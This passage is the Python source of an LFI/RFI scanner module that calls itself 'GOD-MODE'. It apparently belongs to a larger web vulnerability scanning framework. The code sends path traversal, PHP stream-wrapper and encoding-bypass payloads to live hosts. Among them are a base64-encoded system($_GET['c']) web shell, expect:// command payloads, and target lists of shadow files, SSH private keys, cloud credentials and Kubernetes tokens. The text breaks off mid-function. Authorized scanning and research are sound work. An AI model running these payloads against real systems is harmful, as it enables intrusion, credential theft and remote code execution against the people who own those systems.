"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                   LFI/RFI SCANNER v3.0 - GOD-MODE EDITION                    ║
║                Local/Remote File Inclusion Exploitation Engine               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Features:                                                                    ║
║  • Multi-OS Path Traversal (Linux, Windows, macOS, FreeBSD)                  ║
║  • 20+ Encoding Bypass Techniques (URL, Double, Unicode, Overlong)           ║
║  • PHP Wrapper Exploitation (15+ wrappers)                                   ║
║  • Log Poisoning Detection (Apache, Nginx, SSH, Mail)                        ║
║  • Null Byte Injection (Legacy PHP bypass)                                   ║
║  • WAF Detection + Bypass (12+ WAFs)                                         ║
║  • RFI Detection with OOB Callbacks                                          ║
║  • Proc/Self Exploitation (environ, fd, cmdline)                             ║
║  • Session File Inclusion                                                     ║
║  • Wrapper Chaining (zip, phar, data, expect)                                ║
║  • Source Code Disclosure                                                     ║
║  • Cross-Validation + Confidence Scoring (0-100)                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import asyncio
import base64
import binascii
import hashlib
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
from utils.payload_encoder import PayloadEncoder as BasePayloadEncoder

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)

# Version
LFI_SCANNER_VERSION = "3.0.0-GOD-MODE"


class LFIType(Enum):
    """Types of File Inclusion attacks."""
    PATH_TRAVERSAL = auto()      # Basic ../ traversal
    ABSOLUTE_PATH = auto()       # Direct /etc/passwd
    NULL_BYTE = auto()           # Null byte bypass
    DOUBLE_ENCODING = auto()     # %252e%252e%252f
    UNICODE_ENCODING = auto()    # Unicode bypass
    PHP_WRAPPER = auto()         # php://filter etc
    DATA_WRAPPER = auto()        # data:// RCE
    EXPECT_WRAPPER = auto()      # expect:// RCE
    PHAR_WRAPPER = auto()        # phar:// deserialization
    ZIP_WRAPPER = auto()         # zip:// LFI
    LOG_POISONING = auto()       # Log file injection
    SESSION_INCLUSION = auto()   # PHP session files
    PROC_SELF = auto()           # /proc/self/* exploitation
    ENVIRON = auto()             # /proc/self/environ
    FD_LEAK = auto()             # /proc/self/fd/*
    RFI = auto()                 # Remote File Inclusion


class TargetOS(Enum):
    """Target operating system."""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    FREEBSD = "freebsd"
    UNKNOWN = "unknown"


class PHPWrapper(Enum):
    """PHP stream wrappers."""
    FILTER = "php://filter"
    INPUT = "php://input"
    DATA = "data://"
    EXPECT = "expect://"
    PHAR = "phar://"
    ZIP = "zip://"
    ZLIB = "compress.zlib://"
    BZIP2 = "compress.bzip2://"
    GLOB = "glob://"
    SSH2 = "ssh2://"
    RAR = "rar://"
    OGG = "ogg://"
    FTP = "ftp://"
    FTPS = "ftps://"
    HTTP = "http://"
    HTTPS = "https://"


# WAFType - Use centralized version from scanner_helpers
# Keep local enum for backward compatibility with existing code
class WAFType(Enum):
    """WAF types for detection and bypass - wraps centralized version."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    F5_BIG_IP = "f5_bigip"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    AZURE_WAF = "azure_waf"
    WORDFENCE = "wordfence"
    COMODO = "comodo"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class LFIResult:
    """Result of an LFI test."""
    vulnerable: bool
    lfi_type: LFIType
    confidence: int  # 0-100
    payload: str
    evidence: list[str] = field(default_factory=list)
    file_content: Optional[str] = None
    target_os: Optional[TargetOS] = None
    wrapper_used: Optional[PHPWrapper] = None
    rce_possible: bool = False
    source_disclosed: bool = False


class WAFDetector:
    """
    WAF detection for LFI - uses centralized BaseWAFDetector.

    Provides backward-compatible API while leveraging comprehensive
    signatures from utils/scanner_helpers.py.
    """

    @classmethod
    def detect(cls, response: httpx.Response) -> Optional[WAFType]:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        if base_waf_type == BaseWAFType.NONE:
            return None
        return WAFType.from_base(base_waf_type)

    @classmethod
    def is_blocked(cls, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


class PayloadEncoder:
    """
    Encoding techniques for WAF bypass - uses centralized BasePayloadEncoder.

    Provides backward-compatible API while leveraging comprehensive
    encoding functions from utils/payload_encoder.py.
    """

    @staticmethod
    def url_encode(payload: str) -> str:
        """Standard URL encoding."""
        return BasePayloadEncoder.url_encode(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encoding."""
        return BasePayloadEncoder.double_url_encode(payload)

    @staticmethod
    def triple_url_encode(payload: str) -> str:
        """Triple URL encoding."""
        return BasePayloadEncoder.triple_url_encode(payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encoding (../ variations)."""
        return BasePayloadEncoder.unicode_escape(payload)

    @staticmethod
    def overlong_utf8(payload: str) -> str:
        """Overlong UTF-8 encoding."""
        return BasePayloadEncoder.overlong_utf8(payload)

    @staticmethod
    def utf16_encode(payload: str) -> str:
        """UTF-16 encoding."""
        return BasePayloadEncoder.utf16_encode(payload)

    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """Mixed encoding techniques."""
        variations = [
            payload.replace("../", "..%2f"),
            payload.replace("../", "%2e%2e/"),
            payload.replace("../", "%2e%2e%2f"),
            payload.replace("../", "..%252f"),
            payload.replace("../", ".%2e/"),
            payload.replace("../", "%2e./"),
        ]
        return random.choice(variations)

    @staticmethod
    def null_byte_variations(payload: str) -> list[str]:
        """Generate null byte injection variations."""
        return BasePayloadEncoder.null_byte_variations(payload)

    @classmethod
    def get_all_encodings(cls, payload: str) -> list[tuple[str, str]]:
        """Get all encoded variants of a payload."""
        encodings = [
            (payload, "original"),
            (cls.url_encode(payload), "url_encoded"),
            (cls.double_url_encode(payload), "double_encoded"),
            (cls.unicode_encode(payload), "unicode"),
            (cls.overlong_utf8(payload), "overlong_utf8"),
            (cls.utf16_encode(payload), "utf16"),
            (cls.mixed_encoding(payload), "mixed"),
        ]

        # Add null byte variations
        for null_payload in cls.null_byte_variations(payload)[:3]:
            encodings.append((null_payload, "null_byte"))

        return encodings


class PayloadGenerator:
    """Generate comprehensive LFI/RFI payloads."""
    
    # Vulnerable parameters
    LFI_PARAMS = [
        # File parameters
        "file", "filename", "filepath", "path", "pathname", "dir", "directory",
        "folder", "root", "doc", "document", "docs", "pdf",
        # Include parameters
        "include", "inc", "require", "require_once", "include_once",
        # Page/View parameters
        "page", "pg", "p", "view", "show", "display", "content", "cont",
        # Template parameters  
        "template", "tpl", "tmpl", "layout", "skin", "theme", "style",
        # Module parameters
        "module", "mod", "plugin", "action", "act", "func", "function",
        # Language parameters
        "lang", "language", "locale", "loc", "l",
        # Load parameters
        "load", "read", "fetch", "retrieve", "get", "open", "source", "src",
        # Category/Section
        "cat", "category", "section", "board", "detail", "item",
        # Config parameters
        "config", "conf", "cfg", "ini", "settings",
        # Image/Media
        "image", "img", "pic", "photo", "icon", "avatar", "thumb",
        # Log parameters
        "log", "logfile", "debug",
        # Other
        "ruta", "archivo", "fichero", "pagina",  # Spanish
        "datei", "seite",  # German
        "fichier",  # French
    ]
    
    # Linux sensitive files
    LINUX_FILES = [
        # System files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/fstab",
        "/etc/issue",
        "/etc/motd",
        "/etc/crontab",
        "/etc/sudoers",
        "/etc/ssh/sshd_config",
        "/etc/ssh/ssh_config",
        "/etc/security/limits.conf",
        "/etc/security/access.conf",
        # Network
        "/etc/network/interfaces",
        "/etc/netplan/01-netcfg.yaml",
        "/etc/iptables/rules.v4",
        # User files
        "/root/.bash_history",
        "/root/.bashrc",
        "/root/.profile",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/known_hosts",
        "/home/user/.bash_history",
        "/home/user/.ssh/id_rsa",
        # Proc filesystem
        "/proc/version",
        "/proc/cmdline",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/net/tcp",
        "/proc/net/udp",
        "/proc/net/arp",
        "/proc/mounts",
        "/proc/cpuinfo",
        "/proc/meminfo",
        # Web server configs
        "/etc/apache2/apache2.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/etc/apache2/envvars",
        "/etc/apache2/ports.conf",
        "/etc/nginx/nginx.conf",
        "/etc/nginx/sites-enabled/default",
        "/etc/nginx/conf.d/default.conf",
        "/etc/httpd/conf/httpd.conf",
        "/usr/local/etc/apache22/httpd.conf",
        "/opt/lampp/etc/httpd.conf",
        # Log files
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/mail.log",
        "/var/log/cron.log",
        # PHP configs
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php/8.0/fpm/php.ini",
        "/etc/php/8.1/apache2/php.ini",
        "/usr/local/etc/php/php.ini",
        "/etc/php.ini",
        # Application files
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.htaccess",
        "/var/www/html/.env",
        "/var/www/.env",
        "/app/.env",
        "/opt/app/.env",
        # Database configs
        "/etc/mysql/my.cnf",
        "/etc/mysql/mysql.conf.d/mysqld.cnf",
        "/var/lib/mysql/mysql/user.MYD",
        # AWS/Cloud
        "/home/user/.aws/credentials",
        "/root/.aws/credentials",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        # Docker
        "/.dockerenv",
        "/proc/1/cgroup",
    ]
    
    # Windows sensitive files
    WINDOWS_FILES = [
        # System files
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SECURITY",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\system.ini",
        "C:\\boot.ini",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\repair\\SYSTEM",
        # IIS
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        # User files
        "C:\\Users\\Administrator\\Desktop\\",
        "C:\\Users\\Administrator\\.ssh\\id_rsa",
        # Logs
        "C:\\Windows\\debug\\NetSetup.log",
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\Unattended.xml",
        "C:\\Windows\\System32\\sysprep\\sysprep.xml",
        "C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml",
        # XAMPP/WAMP
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\xampp\\php\\php.ini",
        "C:\\xampp\\mysql\\data\\mysql\\user.MYD",
        "C:\\wamp\\apache2\\conf\\httpd.conf",
        # Application configs
        "C:\\inetpub\\wwwroot\\config.php",
        "C:\\inetpub\\wwwroot\\wp-config.php",
    ]
    
    # PHP wrappers payloads
    PHP_WRAPPERS = {
        PHPWrapper.FILTER: [
            # Base64 encode
            "php://filter/convert.base64-encode/resource={file}",
            "php://filter/read=convert.base64-encode/resource={file}",
            # ROT13
            "php://filter/read=string.rot13/resource={file}",
            # Multiple filters
            "php://filter/convert.base64-encode|convert.base64-encode/resource={file}",
            "php://filter/string.rot13|convert.base64-encode/resource={file}",
            # Zlib
            "php://filter/zlib.deflate/convert.base64-encode/resource={file}",
            # Convert
            "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
            "php://filter/convert.iconv.utf-16le.utf-8/resource={file}",
            # Specific file targets
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/convert.base64-encode/resource=../includes/config.php",
            "php://filter/convert.base64-encode/resource=../.env",
        ],
        PHPWrapper.INPUT: [
            "php://input",
        ],
        PHPWrapper.DATA: [
            # Base64 encoded PHP code
            "data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==",  # <?php echo 'LFI_TEST'; ?>
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",  # system($_GET['c'])
            "data://text/plain,<?php echo 'LFI_TEST'; ?>",
            "data:text/plain,<?php echo 'LFI_TEST'; ?>",
        ],
        PHPWrapper.EXPECT: [
            "expect://id",
            "expect://whoami",
            "expect://pwd",
            "expect://ls",
            "expect://cat /etc/passwd",
        ],
        PHPWrapper.PHAR: [
            "phar://./test.phar/test.txt",
            "phar:///tmp/test.phar/test.txt",
            "phar://test.jpg/test.php",
        ],
        PHPWrapper.ZIP: [
            "zip://./test.zip#test.txt",
            "zip:///tmp/test.zip#test.txt",
            "zip://test.jpg#test.php",
        ],
        PHPWrapper.ZLIB: [
            "compress.zlib:///etc/passwd",
            "compress.zlib://./index.php",
        ],
        PHPWrapper.BZIP2: [
            "compress.bzip2:///etc/passwd",
        ],
    }
    
    # Log files for poisoning
    LOG_FILES = {
        "apache": [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/access.log",
            "/var/log/apache/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/usr/local/apache/logs/access_log",
            "/usr/local/apache2/logs/access_log",
            "/opt/lampp/logs/access_log",
        ],
        "nginx": [
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
        ],
        "ssh": [
            "/var/log/auth.log",
            "/var/log/secure",
        ],
        "mail": [
            "/var/log/mail.log",
            "/var/mail/www-data",
            "/var/spool/mail/www-data",
        ],
        "ftp": [
            "/var/log/vsftpd.log",
            "/var/log/proftpd/proftpd.log",
        ],
        "php": [
            "/var/log/php_errors.log",
            "/tmp/php_errors.log",
        ],
    }
    
    # Session file locations
    SESSION_PATHS = [
        "/var/lib/php/sessions/sess_{session_id}",
        "/var/lib/php5/sessions/sess_{session_id}",
        "/var/lib/php7/sessions/sess_{session_id}",
        "/tmp/sess_{session_id}",
        "/tmp/php/sess_{session_id}",
        "C:\\Windows\\Temp\\sess_{session_id}",
        "C:\\php\\sessions\\sess_{session_id}",
    ]
    
    # Path traversal patterns
    TRAVERSAL_PATTERNS = [
        "../" * i for i in range(1, 15)
    ] + [
        "..\\" * i for i in range(1, 15)
    ] + [
        "..../" * i for i in range(1, 10)
    ] + [
        "....\\/" * i for i in range(1, 10)
    ] + [
        "../" * i + "/" for i in range(1, 10)  # Extra slash
    ] + [
        "./.." * i + "/" for i in range(1, 10)  # Dot variations
    ]
    
    # Bypass patterns
    BYPASS_PATTERNS = [
        ("../", "....//"),
        ("../", "..;/"),
        ("../", "..%00/"),
        ("../", ".%2e/"),
        ("../", "%2e./"),
        ("../", "%2e%2e/"),
        ("../", "%2e%2e%2f"),
        ("../", "..%5c"),
        ("../", "..%255c"),
        ("../", "%252e%252e%252f"),
        ("../", "..%c0%af"),
        ("../", "..%c1%9c"),
        ("../", "..%c0%ae"),
        ("../", "%uff0e%uff0e/"),
        ("../", "\\..\\/"),
    ]
    
    @classmethod
    def generate_traversal_payloads(
        cls,
        target_file: str,
        depth: int = 10,
    ) -> list[tuple[str, str]]:
        """Generate path traversal payloads."""
        payloads = []
        
        # Basic traversal
        for i in range(1, depth + 1):
            base = "../" * i
            payloads.append((f"{base}{target_file.lstrip('/')}", f"Traversal depth {i}"))
        
        # Windows backslash
        for i in range(1, depth + 1):
            base = "..\\" * i
            payloads.append((f"{base}{target_file.lstrip('/')}", f"Windows traversal depth {i}"))
        
        # Mixed traversal
        for i in range(1, min(depth, 6)):
            base = "../..\\" * i
            payloads.append((f"{base}{target_file.lstrip('/')}", "Mixed traversal"))
        
        # Double dots variations
        variations = [
            "....//",
            "....\\\\",
            "..\\..\\/",
            "..../",
            "..;/",
        ]
        for var in variations:
            base = var * min(depth, 5)
            payloads.append((f"{base}{target_file.lstrip('/')}", f"Bypass: {var}"))
        
        return payloads
    
    @classmethod
    def generate_wrapper_payloads(cls, target_file: str = None) -> list[tuple[str, str, PHPWrapper]]:
        """Generate PHP wrapper payloads."""
        payloads = []
        
        for wrapper, templates in cls.PHP_WRAPPERS.items():
            for template in templates:
                if "{file}" in template and target_file:
                    payload = template.format(file=target_file)
                    payloads.append((payload, f"{wrapper.value} wrapper", wrapper))
                elif "{file}" not in template:
                    payloads.append((template, f"{wrapper.value} wrapper", wrapper))
        
        return payloads
    
    @classmethod
    def generate_log_poisoning_paths(cls) -> list[tuple[str, str]]:
        """Generate log file paths for poisoning."""
        payloads = []
        
        for log_type, paths in cls.LOG_FILES.items():
            for path in paths:
                # Various traversal depths
                for depth in [3, 5, 7, 10]:
                    traversal = "../" * depth
                    payloads.append(
                        (f"{traversal}{path.lstrip('/')}", f"{log_type} log")
                    )
        
        return payloads


class ResponseAnalyzer:
    """Analyze responses for LFI indicators."""
    
    # File content signatures
    FILE_SIGNATURES = {
        "linux_passwd": [
            "root:x:0:0",
            "root:*:0:0",
            "daemon:x:1:1",
            "nobody:x:",
            "www-data:x:",
            "/bin/bash",
            "/bin/sh",
            "/usr/sbin/nologin",
        ],
        "linux_shadow": [
            "root:$",
            "root:!",
            "root:*:",
            ":0:0:99999:",
        ],
        "linux_group": [
            "root:x:0:",
            "daemon:x:1:",
            "adm:x:4:",
        ],
        "linux_hosts": [
            "127.0.0.1\tlocalhost",
            "::1\tlocalhost",
        ],
        "linux_proc": [
            "HOSTNAME=",
            "PATH=",
            "PWD=",
            "HOME=",
            "SHELL=",
            "USER=",
            "APACHE_",
            "PHP_",
            "SERVER_",
        ],
        "windows_hosts": [
            "# Copyright (c) 1993-",
            "localhost",
            "# localhost name resolution",
        ],
        "windows_ini": [
            "[fonts]",
            "[extensions]",
            "[mci extensions]",
            "[files]",
            "[Mail]",
        ],
        "php_source": [
            "<?php",
            "<?=",
            "<?PHP",
            "defined(",
            "require_once",
            "include_once",
            "$_GET",
            "$_POST",
            "$_REQUEST",
            "$_SERVER",
            "$_SESSION",
            "function ",
            "class ",
        ],
        "config_files": [
            "DB_HOST",
            "DB_USER",
            "DB_PASS",
            "DB_NAME",
            "MYSQL_",
            "APP_KEY",
            "APP_SECRET",
            "API_KEY",
            "AWS_ACCESS",
            "SECRET_KEY",
            "PASSWORD",
            "credentials",
        ],
        "apache_config": [
            "DocumentRoot",
            "ServerRoot",
            "ServerAdmin",
            "<VirtualHost",
            "<Directory",
            "LoadModule",
        ],
        "nginx_config": [
            "server {",
            "location /",
            "root /var/www",
            "fastcgi_pass",
            "proxy_pass",
        ],
        "ssh_keys": [
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "-----BEGIN DSA PRIVATE KEY-----",
            "-----BEGIN EC PRIVATE KEY-----",
            "ssh-rsa AAAA",
            "ssh-ed25519 AAAA",
        ],
    }
    
    # Error messages indicating LFI attempt
    ERROR_INDICATORS = [
        "failed to open stream",
        "no such file or directory",
        "file_get_contents",
        "include(",
        "require(",
        "fopen(",
        "readfile(",
        "file(",
        "fread(",
        "fpassthru(",
        "highlight_file(",
        "show_source(",
        "include_path",
        "open_basedir restriction",
        "permission denied",
        "not within the allowed path",
        "unable to open",
        "could not find",
        "cannot read file",
    ]
    
    @classmethod
    def analyze(
        cls,
        response: httpx.Response,
        payload: str,
        baseline_content: str = "",
    ) -> LFIResult:
        """Analyze response for LFI indicators."""
        content = response.text
        confidence = 0
        evidence = []
        target_os = None
        file_content = None
        rce_possible = False
        source_disclosed = False
        lfi_type = LFIType.PATH_TRAVERSAL
        wrapper_used = None
        
        # Determine LFI type from payload
        if "php://filter" in payload:
            lfi_type = LFIType.PHP_WRAPPER
            wrapper_used = PHPWrapper.FILTER
        elif "php://input" in payload:
            lfi_type = LFIType.PHP_WRAPPER
            wrapper_used = PHPWrapper.INPUT
            rce_possible = True
        elif "data://" in payload or "data:" in payload:
            lfi_type = LFIType.DATA_WRAPPER
            wrapper_used = PHPWrapper.DATA
            rce_possible = True
        elif "expect://" in payload:
            lfi_type = LFIType.EXPECT_WRAPPER
            wrapper_used = PHPWrapper.EXPECT
            rce_possible = True
        elif "phar://" in payload:
            lfi_type = LFIType.PHAR_WRAPPER
            wrapper_used = PHPWrapper.PHAR
            rce_possible = True
        elif "%00" in payload or "\x00" in payload:
            lfi_type = LFIType.NULL_BYTE
        elif "%252" in payload or "%25" in payload:
            lfi_type = LFIType.DOUBLE_ENCODING
        elif "%c0" in payload or "%u00" in payload:
            lfi_type = LFIType.UNICODE_ENCODING
        elif "/proc/self" in payload:
            lfi_type = LFIType.PROC_SELF
        elif "environ" in payload:
            lfi_type = LFIType.ENVIRON
        elif "/fd/" in payload:
            lfi_type = LFIType.FD_LEAK
        elif "log" in payload.lower():
            lfi_type = LFIType.LOG_POISONING
        elif "sess_" in payload:
            lfi_type = LFIType.SESSION_INCLUSION
        elif payload.startswith("http://") or payload.startswith("//"):
            lfi_type = LFIType.RFI
        elif payload.startswith("/"):
            lfi_type = LFIType.ABSOLUTE_PATH
        
        # Check for base64 encoded content (PHP filter)
        if wrapper_used == PHPWrapper.FILTER:
            # Look for base64 pattern
            base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
            match = re.search(base64_pattern, content)
            if match:
                try:
                    decoded = base64.b64decode(match.group()).decode('utf-8', errors='ignore')
                    # Check if decoded content looks like file content
                    for sig_type, signatures in cls.FILE_SIGNATURES.items():
                        for sig in signatures:
                            if sig in decoded:
                                evidence.append(f"Base64 decoded {sig_type}: {sig[:30]}...")
                                confidence += 30
                                file_content = decoded[:500]
                                source_disclosed = "php_source" in sig_type
                                break
                except (ValueError, UnicodeDecodeError, binascii.Error):
                    pass
        
        # Check for direct file content
        for sig_type, signatures in cls.FILE_SIGNATURES.items():
            for sig in signatures:
                if sig in content and sig not in baseline_content:
                    evidence.append(f"File content ({sig_type}): {sig[:30]}...")
                    confidence += 25
                    
                    # Determine OS
                    if "linux" in sig_type:
                        target_os = TargetOS.LINUX
                    elif "windows" in sig_type:
                        target_os = TargetOS.WINDOWS
                    
                    # Check for sensitive content
                    if sig_type in ["php_source", "config_files", "ssh_keys"]:
                        source_disclosed = True
                        confidence += 15
        
        # Check for error messages (partial LFI)
        for error in cls.ERROR_INDICATORS:
            if error.lower() in content.lower() and error.lower() not in baseline_content.lower():
                evidence.append(f"Error indicator: {error}")
                confidence += 10
        
        # Check for RCE success (data://, expect://)
        if rce_possible:
            rce_indicators = [
                "LFI_TEST",
                "uid=",
                "gid=",
                "groups=",
                "/home/",
                "/root",
            ]
            for indicator in rce_indicators:
                if indicator in content and indicator not in baseline_content:
                    evidence.append(f"RCE indicator: {indicator}")
                    confidence += 30
                    break
        
        # Response length change
        if baseline_content:
            len_diff = abs(len(content) - len(baseline_content))
            if len_diff > 100:
                evidence.append(f"Response length change: {len_diff} bytes")
                if len_diff > 500:
                    confidence += 10
        
        # Cap confidence
        confidence = min(confidence, 100)
        
        return LFIResult(
            vulnerable=confidence >= 40,
            lfi_type=lfi_type,
            confidence=confidence,
            payload=payload,
            evidence=evidence,
            file_content=file_content or (content[:500] if confidence >= 60 else None),
            target_os=target_os,
            wrapper_used=wrapper_used,
            rce_possible=rce_possible and confidence >= 50,
            source_disclosed=source_disclosed,
        )


class LFIScanner(ScanModule):
    """
    Local/Remote File Inclusion Scanner v3.0 GOD-MODE.
    
    Comprehensive LFI/RFI detection with:
    - Multi-OS path traversal
    - 20+ encoding bypass techniques
    - PHP wrapper exploitation
    - Log poisoning detection
    - RFI detection
    - Cross-validation and confidence scoring
    """
    
    name = "lfi_scanner"
    version = LFI_SCANNER_VERSION
    
    def __init__(self, settings: Settings) -> None:
        super().__init__(settings)
        self.timeout = settings.timeouts.request_timeout
        self.findings: list[dict[str, Any]] = []
        self.detected_waf: Optional[WAFType] = None
        self.tested_payloads: set[str] = set()
        self.baseline_responses: dict[str, str] = {}
        self.detected_os: Optional[TargetOS] = None
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Execute comprehensive LFI/RFI scan."""
        self.findings = []
        self.tested_payloads = set()
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        urls = asset_data.get("urls", [])
        forms = asset_data.get("forms", [])
        
        logger.info(f"🎯 LFI/RFI Scanner v{self.version} starting on {host}")
        
        async with httpx.AsyncClient(
            timeout=self.timeout,
            verify=False,
            follow_redirects=True,
            limits=httpx.Limits(max_connections=10)
        ) as client:
            
            # Phase 1: WAF Detection
            self.detected_waf = await self._detect_waf(client, base_url, rate_limiter)
            if self.detected_waf:
                logger.info(f"🛡️ WAF detected: {self.detected_waf.value}")
            
            # Phase 2: Collect baseline responses
            await self._collect_baselines(client, urls, rate_limiter)
            
            # Phase 3: Path Traversal Testing
            await self._test_path_traversal(client, base_url, urls, rate_limiter)
            
            # Phase 4: PHP Wrapper Testing
            await self._test_php_wrappers(client, base_url, urls, rate_limiter)
            
            # Phase 5: Form Testing
            await self._test_forms(client, base_url, forms, rate_limiter)
            
            # Phase 6: RFI Testing
            await self._test_rfi(client, base_url, urls, rate_limiter)
            
            # Phase 7: Log Poisoning
            await self._test_log_poisoning(client, base_url, urls, rate_limiter)
            
            # Phase 8: Session Inclusion
            await self._test_session_inclusion(client, base_url, urls, rate_limiter)
            
            # Phase 9: Proc/Self Exploitation
            await self._test_proc_self(client, base_url, urls, rate_limiter)
            
            # Phase 10: Encoding Bypass Tests
            await self._test_encoding_bypass(client, base_url, urls, rate_limiter)
        
        logger.info(f"✅ LFI/RFI scan completed. Found {len(self.findings)} vulnerabilities")
        
        return {
            "module": self.name,
            "version": self.version,
            "findings": self.findings,
            "waf_detected": self.detected_waf.value if self.detected_waf else None,
            "detected_os": self.detected_os.value if self.detected_os else None,
        }
    
    async def _detect_waf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[WAFType]:
        """Detect WAF presence."""
        await rate_limiter.acquire()
        
        test_url = f"{base_url}/?file=../../../etc/passwd"
        
        try:
            response = await client.get(test_url)
            return WAFDetector.detect(response)
        except Exception:
            return None
    
    async def _collect_baselines(
        self,
        client: httpx.AsyncClient,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Collect baseline responses for comparison."""
        for url in urls[:30]:
            await rate_limiter.acquire()
            try:
                response = await client.get(url)
                self.baseline_responses[url] = response.text
            except Exception:
                pass
    
    def _find_vulnerable_params(self, urls: list[str]) -> list[tuple[str, str, dict]]:
        """Find parameters likely vulnerable to LFI."""
        vulnerable = []
        seen = set()
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name in params:
                if param_name.lower() in PayloadGenerator.LFI_PARAMS:
                    key = f"{parsed.path}:{param_name}"
                    if key not in seen:
                        seen.add(key)
                        vulnerable.append((url, param_name, parsed))
        
        return vulnerable
    
    async def _test_path_traversal(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for path traversal vulnerabilities."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # Target files based on detected OS or both
        target_files = [
            "/etc/passwd",
            "/etc/hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
        ]
        
        for url, param_name, parsed in vulnerable_params[:20]:
            baseline = self.baseline_responses.get(url, "")
            
            for target_file in target_files:
                payloads = PayloadGenerator.generate_traversal_payloads(target_file, depth=10)
                
                for payload, description in payloads[:10]:
                    await rate_limiter.acquire()
                    
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    query = urlencode(params, doseq=True)
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    
                    if test_url in self.tested_payloads:
                        continue
                    self.tested_payloads.add(test_url)
                    
                    try:
